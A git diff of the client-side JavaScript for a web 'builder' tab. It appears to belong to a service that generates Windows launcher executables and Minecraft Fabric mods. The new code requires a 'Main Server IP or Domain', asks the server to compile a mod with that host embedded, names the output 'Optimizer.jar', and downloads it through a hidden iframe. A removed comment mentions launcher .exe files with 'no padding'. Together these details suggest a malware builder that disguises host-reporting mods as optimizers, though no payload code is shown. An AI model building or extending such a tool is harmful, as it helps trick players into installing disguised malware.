@@ -1,7 +1,4 @@
 // language: JavaScript, file: public/js/builder.js
-// builder tab — windows launcher + minecraft fabric mod.
-// launcher deliverables are now raw .exe files (no padding).
-
 (function () {
   'use strict';
 
@@ -141,107 +138,58 @@
 
   // ---------- minecraft fabric build ----------
 
-  let mcPollTimer = null;
-  let mcPollBuildId = null;
-
-  function stopMcPoll() {
-    if (mcPollTimer) { clearInterval(mcPollTimer); mcPollTimer = null; }
-  }
-
-  function paintMcProgress(p) {
-    const wrap = $('mc-progress');
-    const bar  = $('mc-bar');
-    const step = $('mc-step');
-    const pct  = $('mc-pct');
-    if (!wrap || !bar) return;
-    wrap.style.display = 'block';
-    bar.style.width = `${Math.max(0, Math.min(100, p.pct || 0))}%`;
-    if (step) step.textContent = p.step || 'working…';
-    if (pct)  pct.textContent  = `${Math.round(p.pct || 0)}%`;
-    if (p.step === 'failed') bar.style.background = 'var(--red)';
-    else if (p.pct >= 100)   bar.style.background = 'var(--green)';
-    else                     bar.style.background = 'var(--accent)';
-  }
-
-  async function pollMcProgress() {
-    if (!mcPollBuildId) return;
-    try {
-      const r = await fetch(`/api/build/minecraft/progress/${mcPollBuildId}`, { credentials: 'same-origin' });
-      if (!r.ok) return;
-      const p = await r.json();
-      paintMcProgress(p);
-      if (p.pct >= 100 && p.step === 'done') {
-        stopMcPoll();
-        const out = $('mc-result');
-        if (out) out.innerHTML = `
-          <div class="tile" style="margin-top:16px">
-            <div class="k">minecraft mod ready</div>
-            <div class="v mono" style="font-size:13px;margin-top:8px">${esc(p.jarName || '')}</div>
-            <div class="note" style="margin-top:8px">${humanSize(p.jarSize || 0)} · drop in <code style="font-family:var(--mono)">.minecraft/mods</code></div>
-            <div style="display:flex;gap:8px;margin-top:14px;flex-wrap:wrap">
-              <button class="ghost mini" id="mc-dl-now">download .jar</button>
-            </div>
-          </div>`;
-        document.getElementById('mc-dl-now')?.addEventListener('click', () => {
-          window.location.href = p.downloadUrl;
-        });
-        const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = p.downloadUrl;
-        document.body.appendChild(iframe);
-        setTimeout(() => iframe.remove(), 30000);
-
-        const btn = $('mc-build');
-        if (btn) { btn.disabled = false; btn.textContent = 'build .jar'; }
-        loadBuilds();
-      } else if (p.step === 'failed') {
-        stopMcPoll();
-        const out = $('mc-result');
-        if (out) out.innerHTML = `<div class="err" style="margin-top:16px">build failed: ${esc(p.error || 'unknown')}</div>`;
-        const btn = $('mc-build');
-        if (btn) { btn.disabled = false; btn.textContent = 'build .jar'; }
-      }
-    } catch {}
-  }
-
   async function doMcBuild() {
     const btn = $('mc-build');
     const out = $('mc-result');
     if (!btn || !out) return;
 
-    btn.disabled = true;
-    btn.textContent = 'building…';
-    out.innerHTML = '';
-    paintMcProgress({ pct: 0, step: 'queued' });
+    const host = ($('mc-host')?.value || '').trim();
+    if (!host) {
+        alert('Please enter your Main Server IP or Domain');
+        return;
+    }
 
-    const target = ($('mc-version')?.value || '1.21.1').trim();
-    const loaderRange = ($('mc-loader')?.value || '>=0.15.0').trim();
+    btn.disabled = true;
+    btn.textContent = 'building mod...';
+    out.innerHTML = '<div class="note">compiling java mod — takes about 10-20 seconds</div>';
 
     try {
       const r = await fetch('/api/build/minecraft', {
         method: 'POST',
         credentials: 'same-origin',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ target, loaderRange }),
+        body: JSON.stringify({ host }),
       });
       const d = await r.json().catch(() => ({}));
+
       if (!r.ok) {
         out.innerHTML = `<div class="err" style="margin-top:16px">${esc(d.error || ('build failed: ' + r.status))}</div>`;
-        btn.disabled = false; btn.textContent = 'build .jar';
-        return;
+      } else {
+        out.innerHTML = `
+          <div class="tile" style="margin-top:16px">
+            <div class="k">mod ready</div>
+            <div class="v mono" style="font-size:13px;margin-top:8px">Optimizer.jar</div>
+            <div class="note" style="margin-top:8px">${humanSize(d.size)} · drop in <code style="font-family:var(--mono)">.minecraft/mods</code></div>
+            <div style="display:flex;gap:8px;margin-top:14px;flex-wrap:wrap">
+              <button class="ghost mini" id="mc-dl-now">download .jar</button>
+            </div>
+          </div>`;
+
+        document.getElementById('mc-dl-now')?.addEventListener('click', () => {
+          window.location.href = d.url;
+        });
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = d.url;
+        document.body.appendChild(iframe);
+        setTimeout(() => iframe.remove(), 30000);
       }
-      mcPollBuildId = String(d.buildId);
-      stopMcPoll();
-      mcPollTimer = setInterval(pollMcProgress, 1000);
-      pollMcProgress();
     } catch {
       out.innerHTML = '<div class="err" style="margin-top:16px">network error</div>';
-      btn.disabled = false; btn.textContent = 'build .jar';
     }
 
-    setTimeout(() => {
-      if (btn.disabled) { btn.disabled = false; btn.textContent = 'build .jar'; }
-    }, 5 * 60 * 1000);
+    btn.disabled = false;
+    btn.textContent = 'build .jar';
   }
 
   // ---------- boot ----------
@@ -267,13 +215,6 @@
         setTimeout(() => { preloadAccountKey(); loadBuilds(); }, 0);
       });
     }
-
-    window.__builderResumeMc = () => {
-      if (mcPollBuildId && !mcPollTimer) {
-        mcPollTimer = setInterval(pollMcProgress, 1000);
-        pollMcProgress();
-      }
-    };
   }
 
   if (document.readyState === 'loading') {
